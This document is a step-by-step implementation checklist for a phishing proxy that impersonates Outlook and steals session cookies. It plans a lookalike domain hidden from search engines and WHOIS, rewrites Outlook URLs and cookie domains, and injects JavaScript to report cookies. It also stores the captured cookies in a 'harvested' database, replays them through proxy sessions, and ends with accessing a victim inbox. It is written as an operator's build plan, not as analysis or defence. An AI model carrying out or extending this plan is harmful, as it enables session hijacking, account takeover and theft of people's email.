# Proxy-Based Cookie AiTM Implementation Checklist

> Complete all 7 steps in order. Do NOT skip steps.

## STEP 1: Infrastructure Setup (CURRENT STEP)

### Pre-Flight Checklist
- [ ] Domain name confirmed (`outlook-proxy.simdiatokens.com` or alternative)
- [ ] Railway project access confirmed
- [ ] Cloudflare Worker access confirmed
- [ ] DNS management access confirmed
- [ ] Railway hobby plan budget confirmed ($5/month)

### Domain Setup
- [ ] Register or configure domain/subdomain
- [ ] Create A record: `outlook-proxy.simdiatokens.com` → Railway IP
- [ ] Set TTL to 300 (5 minutes) for faster propagation
- [ ] Verify DNS propagation with `nslookup`
- [ ] Wait for DNS propagation (5-30 minutes)

### Railway Configuration
- [ ] Add custom domain in Railway Dashboard
- [ ] Verify domain in Railway (green checkmark)
- [ ] Confirm SSL certificate auto-generated
- [ ] Test HTTPS endpoint: `curl -I https://outlook-proxy.simdiatokens.com`
- [ ] Add environment variables:
  - [ ] `PROXY_DOMAIN=outlook-proxy.simdiatokens.com`
  - [ ] `PROXY_ENABLED=true`
  - [ ] `PROXY_SECRET=<random_32_char_string>`
  - [ ] `PROXY_MAX_SESSIONS=50`
  - [ ] `PROXY_RATE_LIMIT=100`

### Cloudflare Worker
- [ ] Update Worker code to allow proxy domain in CORS
- [ ] Add `/proxy-status` endpoint
- [ ] Deploy updated Worker
- [ ] Test Worker: `curl https://simdiatokens-oauth-worker.lubaking-co.workers.dev/proxy-status`

### Testing
- [ ] DNS resolution test: `nslookup outlook-proxy.simdiatokens.com`
- [ ] HTTPS connectivity test: `curl -I https://outlook-proxy.simdiatokens.com`
- [ ] SSL certificate test: `openssl s_client -connect outlook-proxy.simdiatokens.com:443`
- [ ] HTTP/2 test: `curl --http2 -I https://outlook-proxy.simdiatokens.com`
- [ ] WebSocket test: `wscat -c wss://outlook-proxy.simdiatokens.com`

### Security
- [ ] WHOIS privacy enabled on domain
- [ ] robots.txt configured (block search engines)
- [ ] HSTS headers confirmed
- [ ] Rate limiting configured

### Documentation
- [ ] `PROXY_SETUP.md` created
- [ ] `PROXY_CHECKLIST.md` created
- [ ] All environment variables documented
- [ ] Troubleshooting guide reviewed

### Sign-off
- [ ] All tests passing
- [ ] Dashboard accessible
- [ ] SSL valid
- [ ] Ready for Step 2

---

## STEP 2: Proxy Server Core Implementation

### Rust Code
- [ ] Create `src/proxy.rs` with reverse proxy logic
- [ ] URL rewriting: `outlook.live.com` → `outlook-proxy.simdiatokens.com`
- [ ] Cookie domain rewriting: `Domain=outlook.live.com` → `Domain=our-proxy-domain`
- [ ] Request/response forwarding
- [ ] Support GET, POST, PUT, DELETE, PATCH
- [ ] Streaming response handling
- [ ] Redirect rewriting (Location headers)
- [ ] Route: `/*` or `/proxy/{token_id}/*`

### Integration
- [ ] Add `mod proxy` to `main.rs`
- [ ] Add route configuration
- [ ] Update `AppState` with proxy config
- [ ] Test endpoint: `GET /proxy-test`

### Testing
- [ ] Compile: `cargo check`
- [ ] Test endpoint: `curl https://outlook-proxy.simdiatokens.com/proxy-test`
- [ ] Test forwarding: `curl https://outlook-proxy.simdiatokens.com/owa/` (should return Outlook HTML)
- [ ] Test URL rewriting: Verify all links point to proxy domain
- [ ] Test cookie rewriting: Verify Set-Cookie domain is rewritten

### Sign-off
- [ ] Proxy server compiles
- [ ] Requests forwarded to real Outlook
- [ ] URLs rewritten correctly
- [ ] Ready for Step 3

---

## STEP 3: Cookie Capture & Storage

### Database
- [ ] Create `captured_cookies` table
- [ ] Add to `init_db()` in `main.rs`
- [ ] Verify table creation on startup

### Cookie Capture Logic
- [ ] Create `src/cookie_capture.rs`
- [ ] Implement `capture_from_response()`
- [ ] Implement `store_cookies()`
- [ ] Implement `get_cookies()`
- [ ] Implement `is_session_valid()`
- [ ] Implement `refresh_session()`
- [ ] Encrypt sensitive cookies at rest

### JavaScript Injection
- [ ] Create cookie reporting JS
- [ ] Inject into HTML responses
- [ ] Endpoint: `POST /api/proxy/cookie-report`
- [ ] Handle non-HttpOnly cookies

### API Endpoints
- [ ] `POST /api/proxy/cookie-report`
- [ ] `GET /api/proxy/cookies/{token_id}`
- [ ] `DELETE /api/proxy/cookies/{token_id}`
- [ ] Add routes to `main.rs`

### Testing
- [ ] Test cookie capture: Mock response with Set-Cookie
- [ ] Test cookie storage: Verify database records
- [ ] Test cookie retrieval: Verify all cookies returned
- [ ] Test cookie validation: Mock valid/invalid cookies
- [ ] Test JS injection: Verify script is injected in HTML

### Sign-off
- [ ] Cookies captured from responses
- [ ] Cookies stored in database
- [ ] Cookies can be retrieved
- [ ] Ready for Step 4

---

## STEP 4: Proxy Session Management

### Session Logic
- [ ] Create `src/proxy_session.rs`
- [ ] Implement `create_session()`
- [ ] Implement `get_session_url()`
- [ ] Implement `is_session_active()`
- [ ] Implement `get_session_status()`
- [ ] Implement `kill_session()`

### Session URL
- [ ] Generate unique path: `/s/{token_id}/`
- [ ] All requests forwarded to `outlook.live.com`
- [ ] Cookies injected from database
- [ ] Handle cookie expiration

### Lifecycle
- [ ] States: `active`, `pending`, `expired`, `killed`
- [ ] Auto-refresh every 5 minutes
- [ ] OAuth token fallback for refresh
- [ ] Session timeout after 24 hours

### Database
- [ ] Create `proxy_sessions` table (or add to `harvested`)
- [ ] Add `proxy_session_status` column
- [ ] Add `proxy_session_url` column
- [ ] Add `proxy_session_created_at` column

### API Endpoints
- [ ] `POST /api/tokens/{id}/proxy-session/create`
- [ ] `GET /api/tokens/{id}/proxy-session/status`
- [ ] `DELETE /api/tokens/{id}/proxy-session/kill`
- [ ] `GET /api/tokens/{id}/proxy-session/url`
- [ ] Add routes to `main.rs`

### Testing
- [ ] Test session creation
- [ ] Test session URL generation
- [ ] Test cookie injection in requests
- [ ] Test session validity check
- [ ] Test session kill
- [ ] Test auto-refresh

### Sign-off
- [ ] Sessions created successfully
- [ ] Cookies injected in proxy requests
- [ ] Session lifecycle working
- [ ] Ready for Step 5

---

## STEP 5: Dashboard Integration

### Frontend Components
- [ ] Update `token-table.tsx` with proxy actions
- [ ] Add PROXY button to action buttons
- [ ] Add proxy status badge
- [ ] Add "Create Proxy Session" button
- [ ] Add "Kill Proxy Session" button

### Types
- [ ] Update `Token` interface with proxy fields
- [ ] Add `AiRuleSuggestion` interface (from Step 1)

### API Functions
- [ ] `createProxySession(tokenId)` in `utils.ts`
- [ ] `getProxySessionStatus(tokenId)` in `utils.ts`
- [ ] `killProxySession(tokenId)` in `utils.ts`
- [ ] `getProxySessionUrl(tokenId)` in `utils.ts`

### New Page
- [ ] Create `src/app/proxy/[tokenId]/page.tsx`
- [ ] Show session status
- [ ] iframe with proxy URL (if active)
- [ ] Instructions if pending
- [ ] Error display if expired
- [ ] Refresh and Kill buttons

### Outlook Integration
- [ ] Add "Open via Proxy" button in `outlook/[tokenId]`
- [ ] Show only if proxy session active
- [ ] Open proxy URL in new tab

### Status Indicators
- [ ] 🟢 Proxy Active
- [ ] 🟡 Proxy Pending
- [ ] 🔴 Proxy Expired
- [ ] ⚫ Proxy Killed

### Testing
- [ ] Test proxy button in dashboard
- [ ] Test proxy page rendering
- [ ] Test iframe loading
- [ ] Test status indicators
- [ ] Test create/kill flow
- [ ] Test from Outlook page

### Sign-off
- [ ] Dashboard shows proxy sessions
- [ ] Can create sessions from UI
- [ ] Can kill sessions from UI
- [ ] Ready for Step 6

---

## STEP 6: Testing & Security

### Tests
- [ ] Create `src/proxy_test.rs`
- [ ] Test URL rewriting
- [ ] Test cookie rewriting
- [ ] Test path forwarding
- [ ] Test redirect rewriting
- [ ] Test cookie capture
- [ ] Test cookie injection

### Security
- [ ] Rate limiting on proxy endpoints
- [ ] IP whitelist (optional)
- [ ] Request logging
- [ ] Cookie encryption at rest
- [ ] Session timeout (24h)
- [ ] Auto-kill after inactivity
- [ ] HSTS headers
- [ ] XSS protection
- [ ] CSRF tokens

### Middleware
- [ ] `RateLimiter` struct
- [ ] `SecurityHeaders` middleware
- [ ] `RequestLogger` middleware
- [ ] `Sanitizer` for HTML

### Scripts
- [ ] `scripts/test_proxy.sh` automated tests
- [ ] Test proxy endpoint
- [ ] Test cookie capture
- [ ] Test session creation
- [ ] Test URL rewriting

### Environment Variables
- [ ] `PROXY_DOMAIN`
- [ ] `PROXY_SECRET`
- [ ] `PROXY_RATE_LIMIT`
- [ ] `PROXY_MAX_SESSIONS`
- [ ] All documented in README

### Documentation
- [ ] Update `README.md` with proxy architecture
- [ ] Create `PROXY_SECURITY.md`
- [ ] Threat model
- [ ] Security controls
- [ ] Incident response
- [ ] Compliance notes

### Testing
- [ ] End-to-end flow: OAuth → Token → Proxy → Cookies → Dashboard
- [ ] Verify cookies work by accessing inbox
- [ ] Verify auto-refresh
- [ ] Verify session kill
- [ ] Load test with 50 concurrent sessions
- [ ] Security test: attempt unauthorized access

### Sign-off
- [ ] All tests passing
- [ ] Security controls verified
- [ ] Documentation complete
- [ ] Ready for Step 7

---

## STEP 7: Production Deployment

### GitHub
- [ ] Commit all changes
- [ ] Push to `simdie/simdiatokens-v2`
- [ ] Verify Railway auto-deploy triggered
- [ ] Verify Vercel auto-deploy triggered

### Railway
- [ ] Add custom domain in Railway
- [ ] Verify domain status
- [ ] Add environment variables
- [ ] Test proxy endpoint
- [ ] Check logs for errors

### Cloudflare
- [ ] Update Worker code
- [ ] Deploy updated Worker
- [ ] Test Worker endpoints
- [ ] Verify CORS headers

### Database
- [ ] Run migration
- [ ] Verify new tables exist
- [ ] Test database connections
- [ ] Backup existing data

### Monitoring
- [ ] Add proxy request logging
- [ ] Set up alerts for failures
- [ ] Monitor cookie capture rate
- [ ] Monitor session expiration rate
- [ ] Monitor latency

### Documentation
- [ ] Update `DEPLOY.md` with proxy steps
- [ ] Update `README.md` with proxy usage
- [ ] Create `PROXY_USAGE.md`

### Rollback
- [ ] Document how to disable proxy
- [ ] Document how to clear cookies
- [ ] Document how to revoke sessions
- [ ] Test rollback procedure

### Final Verification
- [ ] Create test proxy session
- [ ] Capture cookies from test account
- [ ] Access victim inbox via proxy
- [ ] Verify all features work
- [ ] Test from multiple browsers
- [ ] Test from mobile device

### Sign-off
- [ ] All 7 steps complete
- [ ] Proxy system live
- [ ] Cookies being captured
- [ ] Dashboard showing sessions
- [ ] Full end-to-end working

---

## COMPLETION

- [ ] All 7 steps complete
- [ ] All tests passing
- [ ] Documentation complete
- [ ] Security verified
- [ ] Production deployed
- [ ] Ready for operation

**Project Status**: ✅ PROXY-BASED COOKIE AiTM COMPLETE

---

## Quick Reference

### Domains
- **Frontend**: `simdiatokens-frontend.vercel.app`
- **Backend**: `simdiatokens-production.up.railway.app`
- **Proxy**: `outlook-proxy.simdiatokens.com`
- **Worker**: `simdiatokens-oauth-worker.lubaking-co.workers.dev`

### Key Files
- `PROXY_SETUP.md` - Infrastructure guide
- `PROXY_CHECKLIST.md` - This checklist
- `src/proxy.rs` - Proxy server (Step 2)
- `src/cookie_capture.rs` - Cookie capture (Step 3)
- `src/proxy_session.rs` - Session management (Step 4)
- `src/app/proxy/[tokenId]/page.tsx` - Proxy UI (Step 5)
- `src/proxy_test.rs` - Tests (Step 6)

### Environment Variables
```
PROXY_DOMAIN=outlook-proxy.simdiatokens.com
PROXY_ENABLED=true
PROXY_SECRET=<random_32_char_string>
PROXY_MAX_SESSIONS=50
PROXY_RATE_LIMIT=100
```

### Commands
```bash
# Test DNS
nslookup outlook-proxy.simdiatokens.com

# Test HTTPS
curl -I https://outlook-proxy.simdiatokens.com

# Test SSL
openssl s_client -connect outlook-proxy.simdiatokens.com:443

# Test Proxy
curl https://outlook-proxy.simdiatokens.com/proxy-test

# Test Cookies
curl https://outlook-proxy.simdiatokens.com/api/proxy/cookies/{token_id}

# Test Session
curl -X POST https://simdiatokens-production.up.railway.app/api/tokens/{id}/proxy-session/create
```

### Support
- Railway: https://status.railway.app
- Cloudflare: https://www.cloudflarestatus.com
- DNS Check: https://dnschecker.org
- SSL Test: https://www.ssllabs.com/ssltest
